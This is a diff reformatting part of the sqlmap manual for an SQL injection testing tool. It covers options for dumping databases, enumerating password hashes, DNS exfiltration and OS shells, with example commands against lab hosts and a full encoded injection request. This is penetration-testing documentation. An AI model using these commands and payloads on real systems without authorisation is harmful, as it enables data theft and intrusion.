@@ -1,225 +1,234 @@
 # Usage
 
-    Usage: python sqlmap.py [options]
+```
+Usage: python sqlmap.py [options]
 
-    Options:
-      -h, --help            Show basic help message and exit
-      -hh                   Show advanced help message and exit
-      --version             Show program's version number and exit
-      -v VERBOSE            Verbosity level: 0-6 (default 1)
+Options:
+    -h, --help            Show basic help message and exit
+    -hh                   Show advanced help message and exit
+    --version             Show program's version number and exit
+    -v VERBOSE            Verbosity level: 0-6 (default 1)
 
-    Target:
-        At least one of these options has to be provided to set the target(s)
+Target:
+    At least one of these options has to be provided to set the target(s)
 
-        -d DIRECT           Direct connection to the database
-        -u URL, --url=URL   Target URL (e.g. "www.target.com/vuln.php?id=1")
-        -l LOGFILE          Parse targets from Burp or WebScarab proxy logs
-        -m BULKFILE         Scan multiple targets enlisted in a given textual file
-        -r REQUESTFILE      Load HTTP request from a file
-        -g GOOGLEDORK       Process Google dork results as target URLs
-        -c CONFIGFILE       Load options from a configuration INI file
+    -d DIRECT           Direct connection to the database
+    -u URL, --url=URL   Target URL (e.g. "www.target.com/vuln.php?id=1")
+    -l LOGFILE          Parse targets from Burp or WebScarab proxy logs
+    -m BULKFILE         Scan multiple targets enlisted in a given textual file
+    -r REQUESTFILE      Load HTTP request from a file
+    -g GOOGLEDORK       Process Google dork results as target URLs
+    -c CONFIGFILE       Load options from a configuration INI file
 
-    Request:
-        These options can be used to specify how to connect to the target URL
+Request:
+    These options can be used to specify how to connect to the target URL
 
-        --data=DATA         Data string to be sent through POST
-        --param-del=PDEL    Character used for splitting parameter values
-        --cookie=COOKIE     HTTP Cookie header
-        --cookie-del=CDEL   Character used for splitting cookie values
-        --load-cookies=L..  File containing cookies in Netscape/wget format
-        --drop-set-cookie   Ignore Set-Cookie header from response
-        --user-agent=AGENT  HTTP User-Agent header
-        --random-agent      Use randomly selected HTTP User-Agent header
-        --host=HOST         HTTP Host header
-        --referer=REFERER   HTTP Referer header
-        --headers=HEADERS   Extra headers (e.g. "Accept-Language: fr\nETag: 123")
-        --auth-type=ATYPE   HTTP authentication type (Basic, Digest or NTLM)
-        --auth-cred=ACRED   HTTP authentication credentials (name:password)
-        --auth-private=A..  HTTP authentication PEM private key file
-        --proxy=PROXY       Use a HTTP proxy to connect to the target URL
-        --proxy-cred=PCRED  HTTP proxy authentication credentials (name:password)
-        --ignore-proxy      Ignore system default HTTP proxy
-        --tor               Use Tor anonymity network
-        --tor-port=TORPORT  Set Tor proxy port other than default
-        --tor-type=TORTYPE  Set Tor proxy type (HTTP (default), SOCKS4 or SOCKS5)
-        --check-tor         Check to see if Tor is used properly
-        --delay=DELAY       Delay in seconds between each HTTP request
-        --timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)
-        --retries=RETRIES   Retries when the connection timeouts (default 3)
-        --randomize=RPARAM  Randomly change value for given parameter(s)
-        --safe-url=SAFURL   URL address to visit frequently during testing
-        --safe-freq=SAFREQ  Test requests between two visits to a given safe URL
-        --skip-urlencode    Skip URL encoding of payload data
-        --force-ssl         Force usage of SSL/HTTPS
-        --hpp               Use HTTP parameter pollution
-        --eval=EVALCODE     Evaluate provided Python code before the request (e.g. "import hashlib;id2=hashlib.md5(id).hexdigest()")
+    --data=DATA         Data string to be sent through POST
+    --param-del=PDEL    Character used for splitting parameter values
+    --cookie=COOKIE     HTTP Cookie header
+    --cookie-del=CDEL   Character used for splitting cookie values
+    --load-cookies=L..  File containing cookies in Netscape/wget format
+    --drop-set-cookie   Ignore Set-Cookie header from response
+    --user-agent=AGENT  HTTP User-Agent header
+    --random-agent      Use randomly selected HTTP User-Agent header
+    --host=HOST         HTTP Host header
+    --referer=REFERER   HTTP Referer header
+    --headers=HEADERS   Extra headers (e.g. "Accept-Language: fr\nETag: 123")
+    --auth-type=ATYPE   HTTP authentication type (Basic, Digest or NTLM)
+    --auth-cred=ACRED   HTTP authentication credentials (name:password)
+    --auth-private=A..  HTTP authentication PEM private key file
+    --proxy=PROXY       Use a HTTP proxy to connect to the target URL
+    --proxy-cred=PCRED  HTTP proxy authentication credentials (name:password)
+    --ignore-proxy      Ignore system default HTTP proxy
+    --tor               Use Tor anonymity network
+    --tor-port=TORPORT  Set Tor proxy port other than default
+    --tor-type=TORTYPE  Set Tor proxy type (HTTP (default), SOCKS4 or SOCKS5)
+    --check-tor         Check to see if Tor is used properly
+    --delay=DELAY       Delay in seconds between each HTTP request
+    --timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)
+    --retries=RETRIES   Retries when the connection timeouts (default 3)
+    --randomize=RPARAM  Randomly change value for given parameter(s)
+    --safe-url=SAFURL   URL address to visit frequently during testing
+    --safe-freq=SAFREQ  Test requests between two visits to a given safe URL
+    --skip-urlencode    Skip URL encoding of payload data
+    --force-ssl         Force usage of SSL/HTTPS
+    --hpp               Use HTTP parameter pollution
+    --eval=EVALCODE     Evaluate provided Python code before the request (e.g. "impo
+rt hashlib;id2=hashlib.md5(id).hexdigest()")
 
-    Optimization:
-        These options can be used to optimize the performance of sqlmap
+Optimization:
+    These options can be used to optimize the performance of sqlmap
 
-        -o                  Turn on all optimization switches
-        --predict-output    Predict common queries output
-        --keep-alive        Use persistent HTTP(s) connections
-        --null-connection   Retrieve page length without actual HTTP response body
-        --threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)
+    -o                  Turn on all optimization switches
+    --predict-output    Predict common queries output
+    --keep-alive        Use persistent HTTP(s) connections
+    --null-connection   Retrieve page length without actual HTTP response body
+    --threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)
 
-    Injection:
-        These options can be used to specify which parameters to test for, provide custom injection payloads and optional tampering scripts
+Injection:
+    These options can be used to specify which parameters to test for, provide custo
+m injection payloads and optional tampering scripts
 
-        -p TESTPARAMETER    Testable parameter(s)
-        --skip=SKIP         Skip testing for given parameter(s)
-        --dbms=DBMS         Force back-end DBMS to this value
-        --dbms-cred=DBMS..  DBMS authentication credentials (user:password)
-        --os=OS             Force back-end DBMS operating system to this value
-        --invalid-bignum    Use big numbers for invalidating values
-        --invalid-logical   Use logical operations for invalidating values
-        --no-cast           Turn off payload casting mechanism
-        --no-escape         Turn off string escaping mechanism
-        --prefix=PREFIX     Injection payload prefix string
-        --suffix=SUFFIX     Injection payload suffix string
-        --tamper=TAMPER     Use given script(s) for tampering injection data
+    -p TESTPARAMETER    Testable parameter(s)
+    --skip=SKIP         Skip testing for given parameter(s)
+    --dbms=DBMS         Force back-end DBMS to this value
+    --dbms-cred=DBMS..  DBMS authentication credentials (user:password)
+    --os=OS             Force back-end DBMS operating system to this value
+    --invalid-bignum    Use big numbers for invalidating values
+    --invalid-logical   Use logical operations for invalidating values
+    --no-cast           Turn off payload casting mechanism
+    --no-escape         Turn off string escaping mechanism
+    --prefix=PREFIX     Injection payload prefix string
+    --suffix=SUFFIX     Injection payload suffix string
+    --tamper=TAMPER     Use given script(s) for tampering injection data
 
-    Detection:
-        These options can be used to customize the detection phase
+Detection:
+    These options can be used to customize the detection phase
 
-        --level=LEVEL       Level of tests to perform (1-5, default 1)
-        --risk=RISK         Risk of tests to perform (0-3, default 1)
-        --string=STRING     String to match when query is evaluated to True
-        --not-string=NOT..  String to match when query is evaluated to False
-        --regexp=REGEXP     Regexp to match when query is evaluated to True
-        --code=CODE         HTTP code to match when query is evaluated to True
-        --text-only         Compare pages based only on the textual content
-        --titles            Compare pages based only on their titles
+    --level=LEVEL       Level of tests to perform (1-5, default 1)
+    --risk=RISK         Risk of tests to perform (0-3, default 1)
+    --string=STRING     String to match when query is evaluated to True
+    --not-string=NOT..  String to match when query is evaluated to False
+    --regexp=REGEXP     Regexp to match when query is evaluated to True
+    --code=CODE         HTTP code to match when query is evaluated to True
+    --text-only         Compare pages based only on the textual content
+    --titles            Compare pages based only on their titles
 
-    Techniques:
-        These options can be used to tweak testing of specific SQL injection techniques
+Techniques:
+    These options can be used to tweak testing of specific SQL injection techniques
 
-        --technique=TECH    SQL injection techniques to use (default "BEUSTQ")
-        --time-sec=TIMESEC  Seconds to delay the DBMS response (default 5)
-        --union-cols=UCOLS  Range of columns to test for UNION query SQL injection
-        --union-char=UCHAR  Character to use for bruteforcing number of columns
-        --union-from=UFROM  Table to use in FROM part of UNION query SQL injection
-        --dns-domain=DNS..  Domain name used for DNS exfiltration attack
-        --second-order=S..  Resulting page URL searched for second-order response
+    --technique=TECH    SQL injection techniques to use (default "BEUSTQ")
+    --time-sec=TIMESEC  Seconds to delay the DBMS response (default 5)
+    --union-cols=UCOLS  Range of columns to test for UNION query SQL injection
+    --union-char=UCHAR  Character to use for bruteforcing number of columns
+    --union-from=UFROM  Table to use in FROM part of UNION query SQL injection
+    --dns-domain=DNS..  Domain name used for DNS exfiltration attack
+    --second-order=S..  Resulting page URL searched for second-order response
 
-    Fingerprint:
-        -f, --fingerprint   Perform an extensive DBMS version fingerprint
+Fingerprint:
+    -f, --fingerprint   Perform an extensive DBMS version fingerprint
 
-    Enumeration:
-        These options can be used to enumerate the back-end database management system information, structure and data contained in the tables. Moreover you can run your own SQL statements
+Enumeration:
+    These options can be used to enumerate the back-end database management system i
+nformation, structure and data contained in the tables. Moreover you can run your ow
+n SQL statements
 
-        -a, --all           Retrieve everything
-        -b, --banner        Retrieve DBMS banner
-        --current-user      Retrieve DBMS current user
-        --current-db        Retrieve DBMS current database
-        --hostname          Retrieve DBMS server hostname
-        --is-dba            Detect if the DBMS current user is DBA
-        --users             Enumerate DBMS users
-        --passwords         Enumerate DBMS users password hashes
-        --privileges        Enumerate DBMS users privileges
-        --roles             Enumerate DBMS users roles
-        --dbs               Enumerate DBMS databases
-        --tables            Enumerate DBMS database tables
-        --columns           Enumerate DBMS database table columns
-        --schema            Enumerate DBMS schema
-        --count             Retrieve number of entries for table(s)
-        --dump              Dump DBMS database table entries
-        --dump-all          Dump all DBMS databases tables entries
-        --search            Search column(s), table(s) and/or database name(s)
-        -D DB               DBMS database to enumerate
-        -T TBL              DBMS database table to enumerate
-        -C COL              DBMS database table column to enumerate
-        -U USER             DBMS user to enumerate
-        --exclude-sysdbs    Exclude DBMS system databases when enumerating tables
-        --start=LIMITSTART  First query output entry to retrieve
-        --stop=LIMITSTOP    Last query output entry to retrieve
-        --first=FIRSTCHAR   First query output word character to retrieve
-        --last=LASTCHAR     Last query output word character to retrieve
-        --sql-query=QUERY   SQL statement to be executed
-        --sql-shell         Prompt for an interactive SQL shell
-        --sql-file=SQLFILE  Execute SQL statements from given file(s)
+    -a, --all           Retrieve everything
+    -b, --banner        Retrieve DBMS banner
+    --current-user      Retrieve DBMS current user
+    --current-db        Retrieve DBMS current database
+    --hostname          Retrieve DBMS server hostname
+    --is-dba            Detect if the DBMS current user is DBA
+    --users             Enumerate DBMS users
+    --passwords         Enumerate DBMS users password hashes
+    --privileges        Enumerate DBMS users privileges
+    --roles             Enumerate DBMS users roles
+    --dbs               Enumerate DBMS databases
+    --tables            Enumerate DBMS database tables
+    --columns           Enumerate DBMS database table columns
+    --schema            Enumerate DBMS schema
+    --count             Retrieve number of entries for table(s)
+    --dump              Dump DBMS database table entries
+    --dump-all          Dump all DBMS databases tables entries
+    --search            Search column(s), table(s) and/or database name(s)
+    -D DB               DBMS database to enumerate
+    -T TBL              DBMS database table to enumerate
+    -C COL              DBMS database table column to enumerate
+    -U USER             DBMS user to enumerate
+    --exclude-sysdbs    Exclude DBMS system databases when enumerating tables
+    --start=LIMITSTART  First query output entry to retrieve
+    --stop=LIMITSTOP    Last query output entry to retrieve
+    --first=FIRSTCHAR   First query output word character to retrieve
+    --last=LASTCHAR     Last query output word character to retrieve
+    --sql-query=QUERY   SQL statement to be executed
+    --sql-shell         Prompt for an interactive SQL shell
+    --sql-file=SQLFILE  Execute SQL statements from given file(s)
 
-    Brute force:
-        These options can be used to run brute force checks
+Brute force:
+    These options can be used to run brute force checks
 
-        --common-tables     Check existence of common tables
-        --common-columns    Check existence of common columns
+    --common-tables     Check existence of common tables
+    --common-columns    Check existence of common columns
 
-    User-defined function injection:
-        These options can be used to create custom user-defined functions
+User-defined function injection:
+    These options can be used to create custom user-defined functions
 
-        --udf-inject        Inject custom user-defined functions
-        --shared-lib=SHLIB  Local path of the shared library
+    --udf-inject        Inject custom user-defined functions
+    --shared-lib=SHLIB  Local path of the shared library
 
-    File system access:
-        These options can be used to access the back-end database management system underlying file system
+File system access:
+    These options can be used to access the back-end database management system unde
+rlying file system
 
-        --file-read=RFILE   Read a file from the back-end DBMS file system
-        --file-write=WFILE  Write a local file on the back-end DBMS file system
-        --file-dest=DFILE   Back-end DBMS absolute filepath to write to
+    --file-read=RFILE   Read a file from the back-end DBMS file system
+    --file-write=WFILE  Write a local file on the back-end DBMS file system
+    --file-dest=DFILE   Back-end DBMS absolute filepath to write to
 
-    Operating system access:
-        These options can be used to access the back-end database management system underlying operating system
+Operating system access:
+    These options can be used to access the back-end database management system unde
+rlying operating system
 
-        --os-cmd=OSCMD      Execute an operating system command
-        --os-shell          Prompt for an interactive operating system shell
-        --os-pwn            Prompt for an out-of-band shell, meterpreter or VNC
-        --os-smbrelay       One click prompt for an OOB shell, meterpreter or VNC
-        --os-bof            Stored procedure buffer overflow exploitation
-        --priv-esc          Database process' user privilege escalation
-        --msf-path=MSFPATH  Local path where Metasploit Framework is installed
-        --tmp-path=TMPPATH  Remote absolute path of temporary files directory
+    --os-cmd=OSCMD      Execute an operating system command
+    --os-shell          Prompt for an interactive operating system shell
+    --os-pwn            Prompt for an out-of-band shell, meterpreter or VNC
+    --os-smbrelay       One click prompt for an OOB shell, meterpreter or VNC
+    --os-bof            Stored procedure buffer overflow exploitation
+    --priv-esc          Database process' user privilege escalation
+    --msf-path=MSFPATH  Local path where Metasploit Framework is installed
+    --tmp-path=TMPPATH  Remote absolute path of temporary files directory
 
-    Windows registry access:
-        These options can be used to access the back-end database management system Windows registry
+Windows registry access:
+    These options can be used to access the back-end database management system Wind
+ows registry
 
-        --reg-read          Read a Windows registry key value
-        --reg-add           Write a Windows registry key value data
-        --reg-del           Delete a Windows registry key value
-        --reg-key=REGKEY    Windows registry key
-        --reg-value=REGVAL  Windows registry key value
-        --reg-data=REGDATA  Windows registry key value data
-        --reg-type=REGTYPE  Windows registry key value type
+    --reg-read          Read a Windows registry key value
+    --reg-add           Write a Windows registry key value data
+    --reg-del           Delete a Windows registry key value
+    --reg-key=REGKEY    Windows registry key
+    --reg-value=REGVAL  Windows registry key value
+    --reg-data=REGDATA  Windows registry key value data
+    --reg-type=REGTYPE  Windows registry key value type
 
-    General:
-        These options can be used to set some general working parameters
+General:
+    These options can be used to set some general working parameters
 
-        -s SESSIONFILE      Load session from a stored (.sqlite) file
-        -t TRAFFICFILE      Log all HTTP traffic into a textual file
-        --batch             Never ask for user input, use the default behaviour
-        --charset=CHARSET   Force character encoding used for data retrieval
-        --crawl=CRAWLDEPTH  Crawl the website starting from the target URL
-        --csv-del=CSVDEL    Delimiting character used in CSV output (default ",")
-        --dump-format=DU..  Format of dumped data (CSV (default), HTML or SQLITE)
-        --eta               Display for each output the estimated time of arrival
-        --flush-session     Flush session files for current target
-        --forms             Parse and test forms on target URL
-        --fresh-queries     Ignore query results stored in session file
-        --hex               Use DBMS hex function(s) for data retrieval
-        --output-dir=ODIR   Custom output directory path
-        --parse-errors      Parse and display DBMS error messages from responses
-        --pivot-column=P..  Pivot column name
-        --save              Save options to a configuration INI file
-        --scope=SCOPE       Regexp to filter targets from provided proxy log
-        --test-filter=TE..  Select tests by payloads and/or titles (e.g. ROW)
-        --update            Update sqlmap
+    -s SESSIONFILE      Load session from a stored (.sqlite) file
+    -t TRAFFICFILE      Log all HTTP traffic into a textual file
+    --batch             Never ask for user input, use the default behaviour
+    --charset=CHARSET   Force character encoding used for data retrieval
+    --crawl=CRAWLDEPTH  Crawl the website starting from the target URL
+    --csv-del=CSVDEL    Delimiting character used in CSV output (default ",")
+    --dump-format=DU..  Format of dumped data (CSV (default), HTML or SQLITE)
+    --eta               Display for each output the estimated time of arrival
+    --flush-session     Flush session files for current target
+    --forms             Parse and test forms on target URL
+    --fresh-queries     Ignore query results stored in session file
+    --hex               Use DBMS hex function(s) for data retrieval
+    --output-dir=ODIR   Custom output directory path
+    --parse-errors      Parse and display DBMS error messages from responses
+    --pivot-column=P..  Pivot column name
+    --save              Save options to a configuration INI file
+    --scope=SCOPE       Regexp to filter targets from provided proxy log
+    --test-filter=TE..  Select tests by payloads and/or titles (e.g. ROW)
+    --update            Update sqlmap
 
-    Miscellaneous:
-        -z MNEMONICS        Use short mnemonics (e.g. "flu,bat,ban,tec=EU")
-        --alert=ALERT       Run shell command(s) when SQL injection is found
-        --answers=ANSWERS   Set question answers (e.g. "quit=N,follow=N")
-        --beep              Make a beep sound when SQL injection is found
-        --check-waf         Heuristically check for WAF/IPS/IDS protection
-        --cleanup           Clean up the DBMS by sqlmap specific UDF and tables
-        --dependencies      Check for missing (non-core) sqlmap dependencies
-        --disable-coloring  Disable console output coloring
-        --gpage=GOOGLEPAGE  Use Google dork results from specified page number
-        --identify-waf      Make a through testing for a WAF/IPS/IDS protection
-        --mobile            Imitate smartphone through HTTP User-Agent header
-        --page-rank         Display page rank (PR) for Google dork results
-        --purge-output      Safely remove all content from output directory
-        --smart             Conduct through tests only if positive heuristic(s)
-        --wizard            Simple wizard interface for beginner users
+Miscellaneous:
+    -z MNEMONICS        Use short mnemonics (e.g. "flu,bat,ban,tec=EU")
+    --alert=ALERT       Run shell command(s) when SQL injection is found
+    --answers=ANSWERS   Set question answers (e.g. "quit=N,follow=N")
+    --beep              Make a beep sound when SQL injection is found
+    --check-waf         Heuristically check for WAF/IPS/IDS protection
+    --cleanup           Clean up the DBMS by sqlmap specific UDF and tables
+    --dependencies      Check for missing (non-core) sqlmap dependencies
+    --disable-coloring  Disable console output coloring
+    --gpage=GOOGLEPAGE  Use Google dork results from specified page number
+    --identify-waf      Make a through testing for a WAF/IPS/IDS protection
+    --mobile            Imitate smartphone through HTTP User-Agent header
+    --page-rank         Display page rank (PR) for Google dork results
+    --purge-output      Safely remove all content from output directory
+    --smart             Conduct through tests only if positive heuristic(s)
+    --wizard            Simple wizard interface for beginner users
+```
 
 ## Output verbosity
 
@@ -253,7 +262,8 @@ Run sqlmap against a single database instance. This option accepts a connection 
 
 For example:
 
-    python sqlmap.py -d "mysql://admin:admin@192.168.21.17:3306/testdb" -f --banner --dbs --users
+    $ python sqlmap.py -d "mysql://admin:admin@192.168.21.17:3306/testdb" -f --banner -\
+    -dbs --users
 
 ### Target URL
 
@@ -265,7 +275,7 @@ Run sqlmap against a single target URL. This option requires a target URL in fol
 
 For example:
 
-    python sqlmap.py -u "http://www.target.com/vuln.php?id=1" -f --banner --dbs --users
+    $ python sqlmap.py -u "http://www.target.com/vuln.php?id=1" -f --banner --dbs --users
 
 ### Parse targets from Burp or WebScarab proxy logs
 
@@ -313,7 +323,7 @@ This option makes sqlmap negotiate with the search engine its session cookie to 
 
 For example:
 
-    python sqlmap.py -g "inurl:\".php?id=1\""
+    $ python sqlmap.py -g "inurl:\".php?id=1\""
 
 ### Load options from a configuration INI file
 
@@ -335,7 +345,8 @@ By default the HTTP method used to perform HTTP requests is `GET`, but you can i
 
 For example:
 
-    python sqlmap.py -u "http://www.target.com/vuln.php" --data="id=1" -f --banner --dbs --users
+    $ python sqlmap.py -u "http://www.target.com/vuln.php" --data="id=1" -f --banner --\
+    dbs --users
 
 ### Parameter splitting character
 
@@ -345,7 +356,8 @@ There are cases when default parameter delimiter (e.g. `&` in GET and POST data)
 
 For example:
 
-    python sqlmap.py -u "http://www.target.com/vuln.php" --data="query=foobar;id=1" --param-del=";" -f --banner --dbs --users
+    $ python sqlmap.py -u "http://www.target.com/vuln.php" --data="query=foobar;id=1" \
+    --param-del=";" -f --banner --dbs --users
 
 ### HTTP `Cookie` header
 
@@ -417,10 +429,33 @@ It is possible to provide extra HTTP headers by setting the option `--headers`. 
 
 Example against a MySQL target:
 
-    $ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/get_int.php?id=1" -z "ign,flu,bat,tec=E" --headers="Host:www.target.com\nUser-agent:Firefox 1.0" -v 5
+    $ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/get_int.php?id=1" -z "ign\
+    ,flu,bat,tec=E" --headers="Host:www.target.com\nUser-agent:Firefox 1.0" -v 5
     [...]
     [xx:xx:44] [TRAFFIC OUT] HTTP request [#5]:
-    GET /sqlmap/mysql/get_int.php?id=1%20AND%20%28SELECT%209351%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x3a6161733a%2C%28SELECT%20%28CASE%20WHEN%20%285473%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3D%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%205473%29%20THEN%201%20ELSE%200%20END%29%29%2C0x3a6c666d3a%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29 HTTP/1.1
+    GET /sqlmap/mysql/get_int.php?id=1%20AND%20%28SELECT%209351%20FROM%28SELECT%20COUNT%
+    28%2A%29%2CCONCAT%280x3a6161733a%2C%28SELECT%20%28CASE%20WHEN%20%285473%20%20%20%20%
+    20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%
+    20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%
+    20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%
+    20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%
+    20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%
+    20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%
+    20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%
+    20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%
+    20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%
+    3D%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%
+    20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%
+    20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%
+    20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%
+    20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%
+    20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%
+    20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%
+    20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%
+    20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%
+    20%20%20%20%205473%29%20THEN%201%20ELSE%200%20END%29%29%2C0x3a6c666d3a%2CFLOOR%28RAN
+    D%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%
+    29 HTTP/1.1
     Host: www.target.com
     Accept-encoding: gzip,deflate
     Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
@@ -541,7 +576,8 @@ In case that user wants to change (or add new) parameter values, most probably b
 
 For example:
 
-    python sqlmap.py -u "http://www.target.com/vuln.php?id=1&hash=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib;hash=hashlib.md5(id).hexdigest()"
+    $ python sqlmap.py -u "http://www.target.com/vuln.php?id=1&hash=c4ca4238a0b923820dc\
+    c509a6f75849b" --eval="import hashlib;hash=hashlib.md5(id).hexdigest()"
 
 Each request of such run will re-evaluate value of GET parameter `hash` to contain a fresh MD5 hash digest for current value of parameter `id`.
 
@@ -915,7 +951,7 @@ Example against an Oracle target:
     $ python sqlmap.py -u "http://192.168.136.131/sqlmap/oracle/get_int.php?id=1" --banner
     
     [...]
-    [21:50:11] [INFO] fetching banner
+    [xx:xx:11] [INFO] fetching banner
     web application technology: PHP 5.2.6, Apache 2.2.9
     back-end DBMS: Oracle
     banner:    'Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - Prod'
@@ -943,8 +979,8 @@ Example against a MySQL target:
     $ python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_int.php?id=1" --hostname
     
     [...]
-    [21:44:04] [INFO] fetching server hostname
-    [21:44:04] [INFO] retrieved: debian-5.0-i386
+    [xx:xx:04] [INFO] fetching server hostname
+    [xx:xx:04] [INFO] retrieved: debian-5.0-i386
     hostname:    'debian-5.0-i386'
 
 ### Detect whether or not the session user is a database administrator
@@ -967,7 +1003,8 @@ When the session user has read access to the system table containing information
 
 Example against a PostgreSQL target:
 
-    $ python sqlmap.py -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" --passwords -v 1
+    $ python sqlmap.py -u "http://192.168.136.131/sqlmap/pgsql/get_int.php?id=1" --pass\
+    words -v 1
 
     [...]
     back-end DBMS: PostgreSQL
@@ -1071,7 +1108,8 @@ User can retrieve a DBMS schema by using this switch. Schema listing will contai
 
 Example against a MySQL target:
 
-    $ python sqlmap.py -u "http://192.168.48.130/sqlmap/mysql/get_int.php?id=1" --schema --batch --exclude-sysdbs
+    $ python sqlmap.py -u "http://192.168.48.130/sqlmap/mysql/get_int.php?id=1" --schema\
+    --batch --exclude-sysdbs
 
     [...]
     Database: owasp10
@@ -1132,7 +1170,8 @@ In case that user wants just to know the number of entries in table(s) prior to 
 
 Example against a Microsoft SQL Server target:
 
-    $ python sqlmap.py -u "http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1" --count -D testdb
+    $ python sqlmap.py -u "http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1" --c\
+    ount -D testdb
     [...]
     Database: testdb
     +----------------+---------+
@@ -1152,7 +1191,8 @@ This functionality depends on option `-T` to specify the table name and optional
 
 Example against a Firebird target:
 
-    $ python sqlmap.py -u "http://192.168.136.131/sqlmap/firebird/get_int.php?id=1" --dump -T users
+    $ python sqlmap.py -u "http://192.168.136.131/sqlmap/firebird/get_int.php?id=1" --d\
+    ump -T users
     [...]
     Database: Firebird_masterdb
     Table: USERS
@@ -1212,27 +1252,28 @@ If the query is a `SELECT` statement, sqlmap will retrieve its output. Otherwise
 
 Examples against a Microsoft SQL Server 2000 target:
 
-    $ python sqlmap.py -u "http://192.168.136.131/sqlmap/mssql/get_int.php?id=1" --sql-query \
-    "SELECT 'foo'" -v 1
+    $ python sqlmap.py -u "http://192.168.136.131/sqlmap/mssql/get_int.php?id=1" --sql-\
+    query "SELECT 'foo'" -v 1
 
     [...]
     [hh:mm:14] [INFO] fetching SQL SELECT query output: 'SELECT 'foo''
     [hh:mm:14] [INFO] retrieved: foo
     SELECT 'foo':    'foo'
 
-    $ python sqlmap.py -u "http://192.168.136.131/sqlmap/mssql/get_int.php?id=1" --sql-query \
-    "SELECT 'foo', 'bar'" -v 2
+    $ python sqlmap.py -u "http://192.168.136.131/sqlmap/mssql/get_int.php?id=1" --sql-\
+    query "SELECT 'foo', 'bar'" -v 2
 
     [...]
     [hh:mm:50] [INFO] fetching SQL SELECT query output: 'SELECT 'foo', 'bar''
-    [hh:mm:50] [INFO] the SQL query provided has more than a field. sqlmap will now unpack it into 
